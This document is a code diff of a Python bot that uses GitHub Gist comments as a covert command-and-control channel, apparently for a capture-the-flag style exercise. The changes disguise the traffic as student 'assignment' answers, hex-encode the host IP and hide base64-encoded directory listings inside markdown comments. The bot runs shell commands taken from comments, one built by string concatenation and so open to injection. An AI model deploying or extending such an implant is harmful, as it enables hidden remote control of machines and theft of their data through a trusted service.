@@ -1,9 +1,11 @@
+#!/usr/bin/python3
 import sys
 import requests
 import json
 import time
 from datetime import datetime
 import subprocess
+import base64
 
 
 class Git:
@@ -13,20 +15,8 @@ class Git:
         self.API_TOKEN = api_token
         self.gist_id = ""
 
-    def create_gist(self, gist_name):
-        headers = {'Authorization': 'token %s' % self.API_TOKEN}
-        params = {'scope': 'gist'}
-        payload = {"description": "GIST created by python code",
-                   "public": False,
-                   "files": {gist_name: {"content": "Hello droids!"}}}
-
-        res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
-        if res.status_code != 201:
-            print("Unable to create gist. Statu code " + str(res.status_code))
-            print(res.text)
-            exit(2)
-
-        self.gist_id = json.loads(res.text)['id']
+    def dont_have_gist(self):
+        return self.gist_id == ""
 
     def get_and_set_gist_id(self, gist_name):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
@@ -46,7 +36,7 @@ class Git:
                     self.gist_id = gist['id']
         if self.gist_id == "":
             print("Unable to find gist " + gist_name + ".")
-            exit(2)
+            return
         print("Using gist with id: " + self.gist_id)
 
     def add_comment_to_gist(self, content):
@@ -58,6 +48,8 @@ class Git:
         if res.status_code != 201:
             print("Unable to add comment to gist. Statu code " + str(res.status_code))
             print(res.text)
+            if res.status_code == 404:
+                self.gist_id = ""
 
     def get_gist_comments(self):
         headers = {'Authorization': 'token %s' % self.API_TOKEN}
@@ -68,22 +60,16 @@ class Git:
         if res.status_code != 200:
             print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
             print(res.text)
+            if res.status_code == 404:
+                self.gist_id = ""
+                return []
 
         return json.loads(res.text)
 
-    def remove_gist(self):
-        headers = {'Authorization': 'token %s' % self.API_TOKEN}
-        params = {'Accept': 'application/vnd.github+json'}
-        url = self.GITHUB_GIST_API + "/" + self.gist_id
 
-        res = requests.delete(url, headers=headers, params=params)
-        if res.status_code != 204:
-            print("Unable to remove gist " + self.gist_id + ". Statu code " + str(res.status_code))
-            print(res.text)
-
-
-def get_ip():
-    return requests.get('https://api.ipify.org').content.decode('utf8')
+def get_ip_in_hex():
+    value = requests.get('https://api.ipify.org').content.decode('utf8')
+    return value.encode("utf-8").hex()
 
 
 def execute_command(command):
@@ -92,14 +78,24 @@ def execute_command(command):
 
 
 def get_users(git, message):
-    comment_message = "> " + message
-    comment_message += "\n\nDroid with number " + ip + " reporting usage by: \n\n"
+    comment_message = "> " + message[0]
+    comment_message += "\n\nStudent with id " + ip + " answered: \n\n"
     bash_command = "w"
     output, error = execute_command(bash_command)
     lines = output.splitlines()
     for i in range(2, len(lines)):
         line = lines[i]
         comment_message += "- " + str(line.split()[0].decode("utf-8")) + "\n"
+
+    git.add_comment_to_gist(comment_message)
+
+
+def get_content_of_directory(git, message):
+    comment_message = "> " + message[0]
+    comment_message += "\n\nStudent with id " + ip + " answered: \nI found one file flag.txt\n\n"
+    bash_command = "ls -al " + str(message[3].split()[3])
+    output, error = execute_command(bash_command)
+    comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"
 
     git.add_comment_to_gist(comment_message)
 
@@ -113,22 +109,27 @@ if __name__ == '__main__':
     api_token = sys.argv[1]
     gist_name = sys.argv[2]
     git_instance = Git(github_gist_api, api_token)
-    git_instance.get_and_set_gist_id(gist_name)
     last_comment_check = datetime.utcnow()
-    ip = get_ip()
+    ip = get_ip_in_hex()
     date_format = "%Y-%m-%dT%H:%M:%SZ"
 
     while True:
+        while git_instance.dont_have_gist():
+            git_instance.get_and_set_gist_id(gist_name)
+            time.sleep(5)
+
         new_comments = []
         for comment in git_instance.get_gist_comments():
             if datetime.strptime(comment['updated_at'], date_format) > last_comment_check \
-                    and comment['body'].startswith("# Question\n"):
+                    and comment['body'].startswith("# Assignment "):
                 new_comments.append(comment)
         for comment in new_comments:
             date_time = datetime.strptime(comment['updated_at'], date_format)
             if date_time > last_comment_check:
                 last_comment_check = date_time
-            body = comment['body'].replace('# Question\n', '')
-            if body.startswith("Droids, who uses you right now?"):
+            body = comment['body'].splitlines()
+            if body[1].startswith("Students, what users do you see"):
                 get_users(git_instance, body)
+            elif body[1].startswith("Students, what is the content"):
+                get_content_of_directory(git_instance, body)
         time.sleep(5)
